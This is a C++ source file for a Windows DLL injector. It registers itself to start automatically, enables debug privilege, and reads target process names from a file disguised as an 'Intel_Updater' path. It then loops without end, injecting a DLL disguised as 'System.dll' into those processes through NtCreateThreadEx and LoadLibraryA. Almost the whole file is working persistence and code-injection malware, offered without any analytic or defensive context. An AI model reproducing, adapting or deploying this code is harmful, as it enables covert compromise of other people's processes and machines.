// DLL_INJECTOR.cpp : Defines the entry point for the application.
//

#include "StdAfx.h"
#include "resource.h"
#include <TlHelp32.h>
#include "Logger.h"
#include "RegApp.h"
#include <iostream>
#include <list>
#include <iterator>
#include <string>

#include <UserEnv.h>
#include <wincrypt.h>
#include <stdio.h>

#include <stdlib.h>
#include <Psapi.h>
#include <winsock.h>
#include <windef.h>
#include <atltime.h>

#include <fstream>

using namespace std;
#define INJECT_DLL_NAME ("System.dll")
#define PROC_LIST_FILE_PATH _T("C:\\Windows\\Intel_Updater\\Intel.txt")
list<string> m_listProcName;

typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

#define NT_SUCCESS(x) ((x) >= 0)

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(NTAPI * pfnRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits OPTIONAL,
	IN SIZE_T StackReserve OPTIONAL,
	IN SIZE_T StackCommit OPTIONAL,
	IN PTHREAD_START_ROUTINE StartAddress,
	IN PVOID Parameter OPTIONAL,
	OUT PHANDLE ThreadHandle OPTIONAL,
	OUT PCLIENT_ID ClientId OPTIONAL);

BOOL SetPrivilege(
				  HANDLE hToken,          // token handle
				  LPCTSTR Privilege,      // Privilege to enable/disable
				  BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
				  );
void GetProcNameList();
BOOL DoesFileExist(char* pszFilename);
std::list<DWORD> FindProcessID(const char *szProcessName);
BOOL IsAlreadyInjected(DWORD dwPID, char *szDllName);
BOOL InjectDll(DWORD dwPID, char *szDllName);
BOOL EjectDll(DWORD dwPID, char *szDllName);

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR     lpCmdLine,
					 int       nCmdShow)
{
	//////////////////////////////////// Make app auto start //////////////////////////////////////
	if (!registAppStartup()) {
		printf("Failed to setup app in registry");
	} else {
		printf("Added to registry");
	}
	///////////////////////////////////////// Set Privilege ////////////////////////////////
	HANDLE hToken;
	if(!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
	{
		if (GetLastError() == ERROR_NO_TOKEN)
		{
			if (!ImpersonateSelf(SecurityImpersonation)){
				log_error(L" *** RTN_ERROR - 1! ***\n");
			}

			if(!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)){
				log_error(L" *** OpenThreadToken - RTN_ERROR! ***\n");
			}
		}
		else
			log_error(L" *** RTN_ERROR - 2! ***\n");
	}

	// enable SeDebugPrivilege
	if(!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
	{
		log_error(L" *** SetPrivilege - Failed! ***\n");
		// close token handle
		CloseHandle(hToken);
		return 0;
	}

	////////////////////////////////////Main Inject!!!//////////////////////////////////////
	GetProcNameList();

	std::list<DWORD> list_dwPID;

	DWORD dwLen = 1024;
	char strPath[1024];
	GetCurrentDirectoryA(dwLen, strPath);
	sprintf(strPath, "%s\\%s", strPath, INJECT_DLL_NAME);
	if (!DoesFileExist(strPath)){
		log_inform(L" ********* INJECT-DLL IS NOTHING! **********\n");
		return 0;
	}

	printf("FINDING TARGET PROCESS...\n");
	while(TRUE)
	{
		list<string>::iterator proc_it;
		for (proc_it = m_listProcName.begin();proc_it != m_listProcName.end();proc_it++) {
			string strProcName = (string)*proc_it;
			list_dwPID = FindProcessID(strProcName.c_str());

			if (list_dwPID.size() != 0)
			{
				list<DWORD>::iterator it;
				for (it = list_dwPID.begin();it != list_dwPID.end();it++) {
					DWORD dwPID = (DWORD)(*it);
					if (!IsAlreadyInjected(dwPID, INJECT_DLL_NAME)) {
						if (InjectDll(dwPID, strPath))
							log_inform(L" *** DLL INJECTED SUCCESSFULLY! ***\n");
						else
							log_error(L" *** DLL INJECTION FAILED! ***\n");
					}
				}
			}
			list_dwPID.clear();
			Sleep(1000);
		}
		Sleep(1000);
	}

	return 0;
}

BOOL SetPrivilege(
				  HANDLE hToken,          // token handle
				  LPCTSTR Privilege,      // Privilege to enable/disable
				  BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
				  )
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	TOKEN_PRIVILEGES tpPrevious;
	DWORD cbPrevious=sizeof(TOKEN_PRIVILEGES);

	if(!LookupPrivilegeValue( NULL, Privilege, &luid )) return FALSE;

	// 
	// first pass.  get current privilege setting
	// 
	tp.PrivilegeCount           = 1;
	tp.Privileges[0].Luid       = luid;
	tp.Privileges[0].Attributes = 0;

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		&tpPrevious,
		&cbPrevious
		);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	// 
	// second pass.  set privilege based on previous setting
	// 
	tpPrevious.PrivilegeCount       = 1;
	tpPrevious.Privileges[0].Luid   = luid;

	if(bEnablePrivilege) {
		tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
	}
	else {
		tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tpPrevious.Privileges[0].Attributes);
	}

	AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tpPrevious,
		cbPrevious,
		NULL,
		NULL
		);

	if (GetLastError() != ERROR_SUCCESS) return FALSE;

	return TRUE;
}

void GetProcNameList() {
	m_listProcName.clear();
	string strProcName;
	ifstream fProclist(PROC_LIST_FILE_PATH);
	if (fProclist.is_open())
	{
		while (getline(fProclist, strProcName))
		{
			m_listProcName.push_front(strProcName);
		}
		fProclist.close();
	}
}

BOOL DoesFileExist(char* pszFilename)
{
	HANDLE hf = CreateFile(pszFilename,
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (INVALID_HANDLE_VALUE != hf)
	{
		CloseHandle(hf);
		return true;
	}
	else if (GetLastError() == ERROR_SHARING_VIOLATION)
	{
		// should we return 'exists but you can't access it' here?
		return true;
	}

	return false;
}

std::list<DWORD> FindProcessID(const char *szProcessName)
{
	std::list<DWORD> list_dwPID;
	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;
	// Get the snapshot of the system
	pe.dwSize = sizeof( PROCESSENTRY32 );
	hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );
	// find process
	Process32First(hSnapShot, &pe);
	do
	{
		if(!_stricmp(pe.szExeFile, szProcessName))
		{
			/*
			WCHAR szTest[10];
			swprintf(szTest, 10, L"REAL - %d \n", pe.th32ProcessID); // use L"" prefix for wide chars
			log_error(szTest);
			*/
			list_dwPID.push_back(pe.th32ProcessID);
		}
	}
	while(Process32Next(hSnapShot, &pe));
	CloseHandle(hSnapShot);
	return list_dwPID;
}

BOOL InjectDll(DWORD ProcessId, char *DllFullPath)
{
	if (strstr(DllFullPath, "\\\\") != 0)
	{
		printf("[!]Wrong Dll path\n");
		return FALSE;
	}

	if (strstr(DllFullPath, "\\") == 0)
	{
		printf("[!]Need Dll full path\n");
		return FALSE;
	}

	HANDLE ProcessHandle = NULL;

	ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	if (ProcessHandle == NULL)
	{
		printf("[!]OpenProcess error\n");
		return FALSE;
	}

	UINT32 DllFullPathLength = (strlen(DllFullPath) + 1);
	PVOID DllFullPathBufferData = VirtualAllocEx(ProcessHandle, NULL, DllFullPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (DllFullPathBufferData == NULL)
	{
		CloseHandle(ProcessHandle);
		printf("[!]DllFullPathBufferData error\n");
		return FALSE;
	}
	SIZE_T ReturnLength;
	BOOL bOk = WriteProcessMemory(ProcessHandle, DllFullPathBufferData, DllFullPath, strlen(DllFullPath) + 1, &ReturnLength);

	LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL;
	HMODULE Kernel32Module = GetModuleHandle("Kernel32");
	LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, "LoadLibraryA");
	pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL)
	{
		CloseHandle(ProcessHandle);
		printf("[!]NtCreateThreadEx error\n");
		return FALSE;
	}
	HANDLE ThreadHandle = NULL;
	NtCreateThreadEx(&ThreadHandle, 0x1FFFFF, NULL, ProcessHandle, (LPTHREAD_START_ROUTINE)LoadLibraryAddress, DllFullPathBufferData, FALSE, NULL, NULL, NULL, NULL);
	if (ThreadHandle == NULL)
	{
		CloseHandle(ProcessHandle);
		printf("[!]ThreadHandle error\n");
		return FALSE;
	}
	if (WaitForSingleObject(ThreadHandle, INFINITE) == WAIT_FAILED)
	{
		printf("[!]WaitForSingleObject error\n");
		return FALSE;
	}
	CloseHandle(ProcessHandle);
	CloseHandle(ThreadHandle);
	return TRUE;
}

BOOL EjectDll(DWORD dwPID, char *szDllName)
{
	BOOL bMore = FALSE, bFound = FALSE;
	HANDLE hSnapshot, hProcess, hThread;
	HMODULE hModule = NULL;
	char szModuleNameA[32];
	MODULEENTRY32 me = { sizeof(me) };
	LPTHREAD_START_ROUTINE pThreadProc;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);
	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me))
	{
		memset(szModuleNameA, 0, 32);
		if (!_stricmp(me.szModule, szDllName))
		{
			bFound = TRUE;
			break;
		}
	}
	if (!bFound)
	{
		CloseHandle(hSnapshot);
		return FALSE;
	}
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

	hModule = GetModuleHandleA("kernel32.dll");
	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "FreeLibrary");
	hThread = CreateRemoteThread(hProcess, NULL, 0,
		pThreadProc, me.modBaseAddr,
		0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapshot);
	return TRUE;
}

BOOL IsAlreadyInjected(DWORD dwPID, char *szDllName)
{
	BOOL bMore = FALSE, bFound = FALSE;
	HANDLE hSnapshot;
	HMODULE hModule = NULL;
	char szModuleNameA[32];
	MODULEENTRY32 me = { sizeof(me) };

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);
	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me))
	{
		memset(szModuleNameA, 0, 32);
		if (!_stricmp(me.szModule, szDllName))
		{
			bFound = TRUE;
			break;
		}
	}
	CloseHandle(hSnapshot);
	return bFound;
}